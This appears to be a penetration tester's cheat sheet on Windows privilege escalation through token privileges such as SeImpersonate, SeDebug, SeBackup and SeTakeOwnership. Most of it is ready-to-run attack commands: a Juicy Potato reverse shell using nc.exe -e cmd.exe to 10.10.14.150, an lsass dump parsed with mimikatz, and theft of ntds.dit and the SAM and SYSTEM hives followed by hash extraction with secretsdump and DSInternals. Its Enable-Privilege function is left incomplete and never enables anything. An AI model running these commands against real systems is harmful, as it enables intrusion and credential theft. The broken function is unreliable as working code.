# User Rights Assignment
```powershell
RUN AS ADMINISTRATOR
whoami /priv

SeDebugPrivilege
SeTcbPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
SeTakeOwnershipPrivilege
```

# Disabled Privilege --> ENABLED
```powershell
# Bu daxili funksiya göstərilən hüququ dərhal 'Enabled' vəziyyətinə gətirir
function Enable-Privilege ([string]$privilegeName) {
    $type = Add-Type -PassThru -TypeName "Win32Privs" -MemberDefinition @'
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        
        public struct TOKEN_PRIVILEGES {
            public uint PrivilegeCount;
            public long Luid;
            public uint Attributes;
        }
'@
}


#
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

# SeImpersonate and SeAssignPrimaryToken
```powershell
# Juicy Potato
reg query HKCR\CLSID /s /f LocalService
HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
    LocalService    REG_SZ    winmgmt

.\juicypotato.exe -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.14.150 4141" -t *
sudo nc -lnvp 8443

use exploit/windows/local/ms16_075_reflection_juicy
```

# SeDebugPrivilege
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

Ctrl + Shift + ESC --> lsass.exe --> Create Dump File
```

# SeTakeOwnershipPrivilege
```powershell
takeown /f C:\Windows\NTDS\ntds.dit
icacls C:\Windows\NTDS\ntds.dit /grant %username%:F
vssadmin create shadow /for=C:
```

# SeBackupPrivilege
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Copying NTDS.dit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

# Secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

# SeLoadDriverPrivilege
[Print Operators](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/11-Print%20Operators.md)

# SeRestorePrivilege
[Server Operators]()
